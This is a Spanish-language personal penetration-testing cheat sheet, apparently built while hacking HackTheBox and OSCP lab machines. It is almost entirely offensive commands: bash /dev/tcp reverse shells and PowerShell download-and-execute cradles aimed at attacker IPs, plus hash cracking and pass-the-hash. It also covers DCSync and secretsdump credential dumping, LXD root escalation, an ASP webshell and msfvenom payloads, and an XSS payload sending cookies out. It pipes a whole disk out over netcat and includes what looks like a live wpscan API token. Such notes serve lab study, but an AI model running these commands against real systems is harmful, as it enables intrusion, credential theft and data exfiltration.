****************************************************************Escaneo de puertos**

ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.46
Masscan -p 1-65535 10.10.10.30 -e tun0 –rate=1000
nmap -sU -v 10.10.10.55
nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000

nmap -p 10,20,30 -sC -sV --script vuln ip --> escaneo vulnerabilidades full.
nmap -p 22,80 -sC -sV -oA posion2 --script vuln --stylesheet nmap-bootstrap.xsl 10.10.10.84
xsltproc -o poison2.html nmap-bootstrap.xsl poison2.xml

***************************************************************Cracking password**

1. Extract hash zip
  zip2john filezip
2. Crack the hash
  john --pot=test.pot --wordlist=/usr/share/john/password.lst hash
  john hash -wordlist=/usr/share/wordlists/rockyou.txt
  
  Para saber que tipo de hash, nota: en el archivo hash.txt va el hash a crackear.
  john --wordlist=/usr/share/john/password.lst --rules= hash.txt
  
  una vez identificado se lanza el siguiente comando
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash.txt
  
  hydra -l admin -P rockyou.txt 10.10.10.75 http-post-form "nibleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
  
  Crack hashes kerberos ntlm
  D:\hashcat-6.0.0>hashcat.exe --user -m 1000 ntlm.forest.txt rockyou.txt -r d:\hashcat-6.0.0\rules\InsidePro-PasswordsPro.rule -O
  
  crear diccionario con hashcat, primero se crea un archivo con las palabras, después se le agrega los caracteres en este caso 2019 y 2020 a cada palabra del diccionario.
  for i in $(cat dictionary.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > dictionary.txt
  
  agregar caracteres al diccionario creado con hashcat
  D:\hashcat-6.0.0>hashcat.exe --force --stdout dictionary.txt -r d:\hashcat-6.0.0\rules\best64.rule -r d:\hashcat-6.0.0\rules\toggles1.rule > dictionary2.txt
 
 seleccionar las palabras de menos de 8 caracteres
 cat dictionary2.txt | sort -u | awk 'length($0) > 8' | wc -l > dictionary2.txt
 
 md5
 
 >hashcat.exe -m 0  3cc31cd246149aec68079241e71e98f6  rockyou.txt

Tipos de hashesh
https://www.whitehatsec.com/blog/magic-hashes/

crackear un id_rsa
ssh3john id_rsa > hash
john hash --wordlist=/usr/share/wordlist/rockyou.txt

crack tgt y tgs de window en linux funciona.

hashcat -m 13100 -o capture.cracked -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable

en windows

crack passwords MD5 wordpress, se reconocen porque empiezan por $H o $P
windows  hashcat.exe -O -m 400 -a 0 -o cracket.txt pass.txt rockyou.txt
linux hashcat -O -m 400 -a 0 -o ~/oscp/cracked.txt ~/oscp/capitulo24/pass.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt

NOTA en windows es mucho mas rápido. con hascat

sha512 es el hash de linux, el cual contiene 106 caracteres.
hashcat -m 1800 -a 0 -o cracked.txt passwords.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable

ntlm 
"hashcat --username -m 1000 -a 0 -o cracked.txt hash2 /usr/share/seclists/Passwords/cirt-default-passwords.txt --force --potfile-disable
hashcat --user -m 1000 -o craced1.txt -a 0  10.1.11.31 rockyou.txt -r rules\Incisive-leetspeak.rule -O"

https://hashcat.net/wiki/doku.php?id=example_hashes

************************************************************* comandos para después de obtener una shell**
Permiten que se pueda interactuar con la shell para poder usar las teclas subir bajar y digitar bien en editores de texto.

ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>

Comando para obtener una shell de linux cuando se tiene una conexión con nc.

SHELL=/bin/bash script -q /dev/null
ó
bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
ó
python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty;pty.spawn("/bin/bash");'

************************************************************* Scan web*********************************

Scan subdirectory

gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt
dirb http://10.10.10.6
gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u https://10.10.10.7/ -w /quit -k

scan extensions files
gobuster -w /usr/share/wordlists/dirb/small.txt dir --url http://10.10.10.56/cgi-bin- s 200,204,301,302,307,401,403 -x sh,pl

Para saltar los avisos ssl
gobuster dir --url https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k
gobuster -e -k -u https://brainfuck.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x .php,.txt,.html -s "200" -a CustomAgent -o reportgobuster10.10.10.17.txt

scan files & folders

  gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirb/big.txt

revisando LFI
http://10.10.10.55/?file=../../../../etc/passwd

Si se puede subir una reverse_shell.php se puede llamar con el siguiente LFI URL
http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php 

escaneo agresivo de wordpress
wpscan --url http://10.10.10.88/webservices/wp/ -e ap --api-token  hz6s59smi5hjaWUXjdx1brjEGW08CQsBrOGFWP3lTmc --plugins-detection aggressive  
wpscan --url http://10.10.10.37 -e u,ap,tt,t  --api-token  hz6s59smi5hjaWUXjdx1brjEGW08CQsBrOGFWP3lTmc

wfuzz -z file,/usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=1234567" --hs "No account found with that username" http://10.10.10.97/login.php

************************************************************Arquitectura de sistesmas operativos***************************

Windows wmic OS get OSArchitecture
windows systeminfo | findstr /I type
Linux uname -r

************************************************************Servidor HTTP Temporal *************************************

python3 -m SimpleHTTPServer 80
python3 -m http.server 8000

************************************************************Firewall rules******************************************
iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT

***********************************************************directorio activo****************************************
pip install bloodhound
bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -n 10.10.10.30

Extracción de un hash del TGT Ticket
GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30 > hash

Conectarse al servidor por medio de WinRm
evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19

Dump Hashes DC
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30

conectarse al servidor con hashe
psexec.py megacorp.local/administrator@10.10.10.30 -hashes <NTML hash>:<NTLM hash>

Nota: siempre se debe correr bloohound de la siguiente manera y desde el usuario kali

bloodhound desde terminal pero no desde tmux ni desde root. con el neo4j/neo4j

************************************************************Contenedores de linux LXC***********************************
Contienen un entorno de servicios, entre ellos contienen comandos para poder ejecutar en el sistema operativo:

En la máquina atacante descargar:
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

Esto genera un archivo con el nombre alpine-v3.11-x86_64-20200505_1834.tar.gz el cual debe ser sube al remote host

se crea un alias a la imagen
lxc image import ./alpine-v3.11-x86_64-20200505_1834.tar.gz --alias rootimage
lxc init rootimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

**********************************************************smb************************************************
smbclient -N -L \\10.10.10.27\\
smbclient -N \\10.10.10.27\backups
smbclient  -N \\\\10.11.1.231\\home

Crear una unidad de red para compartir con usuario y contraseña.
impacket-smbserver Sfire $(pwd) -smb2support -user diego -password Contrasenia
Crear una unidad de red para compartir sin usuario y contraseña.
impacket-smbserver www $(pwd) -smb2support

compartir carpeta desde linux
smbserver.py SMB ~/osc/smb

smbmap -H 10.10.10.123 -R --depth 5
*********************************************************Tunnel ssh ****************************************
ssh -i root.key -L9000:10.10.10.75:80 10.10.10.73
L9000: Puerto local a publicar
10.10.10.75:80: IP y puerto remoto a consultar
10.10.10.73 Servidor mediante el cual se realizará la salida.
Al final en el navegador se consultará como http://localhost:9000

redirect desde windows a kali el tráfico
conectarse a kali, desde puty con ssh -D8091 kali@192.168.0.5
Después desde burpsuite en windows, en user options, poner el socket: 127.0.0.1 8091, nota: no responde PING, todas las consultas son resueltas a traves de burpsuite.

Conexión reversa por un servicio que solo está a nivel localhost en el target
ssh -R 1337:127.0.0.1:52846 kali@10.10.14.6

****************************************************Oracle***************************************************
https://github.com/quentinhardy/odat
Con el programa odat se puede realizar una enumeración del objetivo
python3 odat.py sidguesser -s 10.10.10.82 -p 1521 --> Para tratar de averiguar los SID
python3 odat.py passwordgesser -s 10.10.10.82 -p 1521 -d EXE --accounts-file accounts/oracle_default_password.txt --> Con este comando se realiza un ataque de fuerza bruta con el archivo oracle_default_password.txt, el cual es copiado del directorio de metasploit a la carpeta accounts del programa ODAT, es importante no dejar espacios en el archivo. con vi :%s/ /\//g 
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ oracle.exe ~/HackTheBox/silo/oracle.exe --> utlfile: se usa para subir archivos --sysdba: se usa para decirle que es administrador --putfile: a.) va la ruta donde quiere dejarse el archivo, preferiblemente en "C:\ exploit.exe" se debe dejar un espacio en la ruta del archivo. c). por último la ruta donde se encuentra localmente el exploit.
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ oracle.exe --> externaltable p--exec para ejecución de algún archivo en el servidor.

Para conectarse a la dbs oracle, desde kali:
sudo -s
source /etc/profile
sqlplus scott/tiger@10.10.10.82:1521/XE

NOTA: La máquina de HTB Silo, describe muy bien el procedimiento
https://www.youtube.com/watch?v=2c7SzNo9uoA&feature=emb_title

Montar disco duro virtual
guestmount --add fil-vhd --inspector --ro -v /mnt/vhd

*************************************Buscar archivos ********************
private key
 find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"
 
buscar archivos ejecutables windows 
attrib *.* -h -s /h /s
Buscar flag en windows
C:\>dir /b/s *.txt

buscar archivos en meterpreter
search -d / -f "*.txt"
search -f *.txt

Buscar root.txt linux
find . -name *root.txt -exec wc -c {} \;
find / -iname *.txt

 **********************************monitorear crontabs
 ./pspy64
 https://github.com/diegoexploit/HackTheBox/blob/master/monitoring.sh
 ***********************************iptables***************************
 iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j REJECT
netfilter-persistent save
netfilter-persistent reload

*********************************PortFowd- meterpreter
portfwd add -l 445 -r 127.0.0.1 -p 445
*********************************merlin
https://www.hackingarticles.in/command-and-control-guide-to-merlin/
********************************Descargar archivos******************
windows
Cuando se está usando lenguaje .net y se está lanzando comandos desde burpsuite

cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/file.txt')
cmd /c certutil -urlcache -split -f http://10.10.14.27/agent.exe C:\\users\\public\\agent.exe")

desde cmd windows
certutil -urlcache -split -f http://10.10.14.27/agent.exe agent.exe

desde linux 
wget http://10.10.14.27/agent.exe
curl 10.10.14.27/agent.exe -o agent.exe

desde una conexión en reversa
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/file.txt')
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/rev.ps1')"
**********************************************websell asp web.config*******************************************
Se agrega esto a la línea del web config https://github.com/diegoexploit/HackTheBox/blob/master/web.config
Se pueden ir cambiando los comandos que están dentro de las comillas, incluso se puede agregar powershell, siempre con cmd /c
Máquina de referencia Bounty
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c dir C:\users\public")
o = cmd.StdOut.Readall()
Response.write(o)
%>

*************************************Analizador de vulnerabilidades interno con sherlock
Se pone el archivo en kali y se lanza con este comando para que descargue y haga el análisis.
echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.27/Sherlock.ps1") | powershell -noprofile -
************************************grep***********************************************************
grep -oP '\d{1,5}/open' allports.gnmap | sort -u | grep -oP '\d{1,4}/' > ports.list -->Comando para extraer los puertos del resultado de una escaneo de puertos con -oA.

***************************************kill Process forced***********************
taskkill /F /IM MSBuild.exe  windows
kill -9 pid linux
*************************************Enviar el disco duro de linux comprimido a través de netcat*********
ls | grep dm
dd if=dm-0 gzip -1 - | nc 10.10.14.27 8003

gunzip disk.img.gz
mount disk.img /mnt

<a class="vglnk"https://github.com/quentinhardy/odat"rel="nofollow"><span>odat.py</span>

***************************************Privileges¨*********************************
windows
http://ohpe.it/juicy-potato

Agregar provilegios a los archivos en windows
cacls root.txt 
cacls root.txt /t /e /p alfred:F
cacls root.txt /e /r alfred

https://gtfobins.github.io/
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
***********************************************powershell**********************************
Descargar archivos
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/file.txt')
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/rev.ps1')"

Ejecutar comandos con privilegios con PowerUp.ps1
Descargar primero
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/PowerUp.ps1')

encontrar la contraseña del usuario
Invoke-AllChecks

Configurar los privilegios
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)

Revisar si quedó configurado
$cred

Lanzar el reverse conection
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/diego.ps1')" -Credential $cred

Probar para lanzar un reverse conection con los mismos privilegios

************************************************Directorio activo máquina forest*********************************
ataque de fuerza bruta en directorio activo
crackmapexec smb 10.10.10.161 -u userslist.ldap -p dictionary2.txt

Bloodhound
SharpHound.exe -c all para extraer toda la información para analizar con bloodhound, la ejecución de este archivo debe realizarse dentro del servidor directorio activo.
Generando archivos para bloodhound desde kali
bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -ns 10.10.10.161
bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161

Lanzar bloodhound en kali
neo4j console desde terminal
bloodhound desde terminal pero con privlegios normales.

Dumpear hashes:
Con una cuenta con privilegios de ejecución de comando "ECHANGE WINDOWS PERMISSIONS es un grupo al que debe pertenecer el usuario para poder lograrlo.
secretsdump.py htb/diego@10.10.10.161

Conectar con psexec como administrador si se conoce el hash
psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161

Conectar con credenciales al servidor de directorio activo cuando se encuentra el puerto 5985 abierto.
ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice 

dentro de powershell
Get-ADDomain htb.local para saber el SID de un dominio.

Almacenar credenciales para conexiones bien sea de smb o para otras actividades con consola en reverso de powershell
$pass = convertto-securestring 'Contrasenia' -AsPlainText -Force
$pass
$cred = New-Object System.Management.Automation.PSCredential('diego', $pass)
$cred

Mapar unidad de red con credenciales almacenados en powershell.
New-PSDrive -Name diego -PSProvider FileSystem -Credential $cred -Root \\10.10.14.45\Sfire

Mapear unidad de red sin credenciales
Crear servidor smb impacket-smbserver www $(pwd) -smb2support
New-PSDrive -name www -PSProvider "FileSystem" -Root "\\10.10.14.20\www"

Buscar usuario de un directorio activo y sacarlos en un archivo
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' > person.out
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName  | awk '{print $2}' >userlist.ldap

después de haber creado un usuario y contraseña en el dominio, después de haberlo agregado a un grupo de administración, se ejecuta este comando, para extraer hashes con secretsdump.py
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync

contenido de un archivo powershell
Get-Content user.txt | Measure-Objec -Character

************************************************Enumeracion
LinEnum.py en linux
winPEAS.exe en windows
Sherlocak.ps1 script para vulnerabilidaes echo IEX(New-Object Net.WebClient).downloadString("http://192.168.0.5/Sherlock.ps1") | powershell -noprofile -
***********************************************XSS****************************************
Bankrobber
<img src=http://10.10.14.20/diego.jpeg />
<img src=x onerror=this.src="http://10.10.14.20/?cookie=" btoa(document.cookie) />
<script src=http://10.10.14.20/backdoor.js></script>

********************************************Tunneling reverse connection*************************Bankrobber
./chisel.exe client 10.10.14.20:9002 R:910:127.0.0.1:910
python chisel server 9002 --reverse

*******************************************Compilando con gcc********************
apt install gcc-multilib 
gcc -m32 -o setuid setuid.c
gcc -o salida file.c
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32 --> esta última opción compila el código reparando los problema que encuentre.

*****************************************Comprimir y descomprimir*********************
7z ls file

****************************************SAM**********************************************

impacket-secretsdump -sam SAM -system SYSTEM local

****************************************esteganografia*************************************
steghide extract -sf  imagen.jpeg -p paswword

Crackear password de imagen con steganography
stegcracker imagen.jpeg

******************************************************CURL**************************************************
curl -X POST http://10.10.10.143/diego.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/1234 0>&1"' ejecutando comandos con curl y la webshell recientemente subida.

*****************************************************Magic Binary******************************************************
https://en.wikipedia.org/wiki/List_of_file_signatures
máquina swagshop


***************************************************SCP************************************************************
copiar local al servidor
scp archivo.txt user@10.10.10.48:/home/usr/
copiar del servidor al local
scp user@10.10.10.48:/home/pi/usb.dd .
*********************************************montar imagenes o sacar imagenes de dispositivos****************************************
sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd
****************************************************Buscar archivos en el sistema con permisos owner SUID************************************
find / -perm -4000 2>/dev/null | xargs ls -la
find / -user jimmy 2>/dev/null | xargs ls -la
find / -user jimmy -ls 2>/dev/null 
find / newermt "2019-11-28"  ! -newermt "2019-12-10" -ls 2>/dev/null
**************************************************Crear hash de php****************************************************************************
|-------(root@kali)-------|(~)
|
|-->{SFire129}#php -a
Interactive mode enabled

php > echo password_hash('cmd', PASSWORD_DEFAULT);
$2y$10$2Q9eIXcbrxiFG0G9pLPzJu503fG67yj77kP6msbi0b6OWf2uzM2M2
php >

*************************************************enumeracion mysql**************************************************

describe users;
select id, username password from users;
**************************************************Comando grep******************************************************
buscar en todo, lo que tenga passwd y a su vez sql
grep -R -i passwd . | grep -i sql

*************************************************Fuerza bruta********************************************************
Fuerza bruta a ssh
medusa -h 10.10.10.171 -U users.txt -P passwords.txt  -M ssh 10.10.10.171
*************************************************nano con privs**************************************************
nano con privilegios
sudo /bin/nano /opt/ona
control + r y luego control + x
Luego se escribe lo siguiente:
reset; sh 1>&0 2>&0
********************************************extracción de metadata***************************************************

metagoofil -d fiducentral.com  -t pdf,docx -l 400 -n 400 -o /home/kali/fiducentral/metadata/
cat extract.html | grep -i Author | cut -d ":" -f 2 | sort -u

******************************************msfvenom****************************************************************
war
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4447 -f war > diego.war
****************************************compresores*************************************************************
extraer
gunzip access.log.txt.gz
=============Para conectarse como root a una máquina línux sin contraseña===================
         kali linux crear un id_rsa
         ssh-keygen
         cat ~/.ssh/id_rsa.pub
         
         en la máquina víctima
         mkdir /root/.ssh
         echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys
         
         Realizar la conexión desde kali
         
         ==============================hexadecimal decode=========================
         echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps 
=================vulnerabilidades off line windows suggester=========
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2020-09-04-mssb.xls sis.txt
